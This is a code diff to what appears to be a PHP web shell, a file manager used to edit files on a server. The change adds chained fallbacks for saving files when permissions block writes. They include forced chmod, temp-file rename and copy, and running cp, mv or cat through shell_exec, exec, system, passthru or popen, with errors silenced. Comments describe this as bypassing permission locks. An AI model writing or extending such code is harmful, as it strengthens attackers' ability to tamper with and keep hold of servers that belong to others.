@@ -1961,14 +1961,74 @@ else if($awal=="edit_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "
 		{
 			unset($_SESSION['ys_took']);
 			$content = $_POST['content'];
-            if (is_writeable($default_dir . $pemisah . $namaBerkas)) {
-                if (file_put_contents($default_dir . $pemisah . $namaBerkas, $content) !== false) {
-                    $status = " <span class='qalin' style='color:#00FF00;'>Saved successfully!</span>";
-                } else {
-                    $status = " <span class='qalin' style='color:#ff5555;'>Error saving file. Check permissions.</span>";
+            $targetFile = $default_dir . $pemisah . $namaBerkas;
+            $save_success = false;
+            $used_method = '';
+
+            // 0. Coba ubah permission dulu agar writable
+            @chmod($targetFile, 0644);
+
+            // --- METODE 1: Standard PHP ---
+            if (!$save_success && file_put_contents($targetFile, $content) !== false) {
+                $save_success = true; $used_method = 'file_put_contents';
+            }
+
+            // --- METODE 2: Fopen/Fwrite (Stream) ---
+            if (!$save_success) {
+                $fp = @fopen($targetFile, 'w');
+                if ($fp) {
+                    if (@fwrite($fp, $content) !== false) {
+                        $save_success = true; $used_method = 'fwrite';
+                    }
+                    @fclose($fp);
                 }
+            }
+
+            // --- METODE 3: Tulis ke TMP lalu Pindah (Bypass Permission/Lock) ---
+            if (!$save_success) {
+                $tmp_file = tempnam(sys_get_temp_dir(), 'edit_');
+                if (@file_put_contents($tmp_file, $content) !== false) {
+                    // 3a. Rename/Move PHP
+                    if (@rename($tmp_file, $targetFile)) {
+                        $save_success = true; $used_method = 'rename_tmp';
+                    }
+                    // 3b. Copy PHP
+                    elseif (@copy($tmp_file, $targetFile)) {
+                        $save_success = true; $used_method = 'copy_tmp';
+                    }
+                    // 3c. System Command (cp/mv/cat)
+                    else {
+                        $cmd_run = function($c) {
+                            if(function_exists('shell_exec')){ @shell_exec($c); return true; }
+                            if(function_exists('exec')){ @exec($c); return true; }
+                            if(function_exists('system')){ @system($c); return true; }
+                            if(function_exists('passthru')){ @passthru($c); return true; }
+                            if(function_exists('popen')){ $p=@popen($c,'r'); if($p){pclose($p);return true;} }
+                            return false;
+                        };
+                        
+                        $c_cp  = "cp " . escapeshellarg($tmp_file) . " " . escapeshellarg($targetFile);
+                        $c_mv  = "mv " . escapeshellarg($tmp_file) . " " . escapeshellarg($targetFile);
+                        $c_cat = "cat " . escapeshellarg($tmp_file) . " > " . escapeshellarg($targetFile);
+
+                        if ($cmd_run($c_cp)) { $save_success = true; $used_method = 'exec_cp'; }
+                        elseif ($cmd_run($c_mv)) { $save_success = true; $used_method = 'exec_mv'; }
+                        elseif ($cmd_run($c_cat)) { $save_success = true; $used_method = 'exec_cat'; }
+                    }
+                    @unlink($tmp_file); // Hapus file sampah
+                }
+            }
+
+            // --- VERIFIKASI ANTI-0KB ---
+            // Jika konten asli tidak kosong, tapi hasil di server 0 byte, maka anggap gagal.
+            clearstatcache();
+            if ($save_success && strlen($content) > 0 && (!file_exists($targetFile) || filesize($targetFile) === 0)) {
+                $save_success = false;
+                $status = " <span class='qalin' style='color:#ff5555;'>Saved via {$used_method} but result is 0kb (Write Failed).</span>";
+            } elseif ($save_success) {
+                $status = " <span class='qalin' style='color:#00FF00;'>Saved successfully via <strong>{$used_method}</strong>!</span>";
             } else {
-                $status = " <span class='qalin' style='color:#ff5555;'>File is not writeable.</span>";
+                $status = " <span class='qalin' style='color:#ff5555;'>Failed to save using all methods. Check Permission/Disk Space.</span>";
             }
 		}
 		$oxuUrl = "?awal=baca_file&fayl=" . kunci($namaBerkas) . "&berkas=" . kunci($default_dir);
